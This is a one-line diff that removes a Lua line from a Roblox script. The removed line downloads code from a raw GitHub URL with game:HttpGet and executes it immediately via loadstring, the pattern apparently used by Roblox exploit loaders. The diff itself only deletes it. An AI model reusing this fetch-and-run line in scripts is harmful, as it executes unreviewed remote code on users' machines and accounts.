@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/coca-cola-espiona/main/Main", true))()
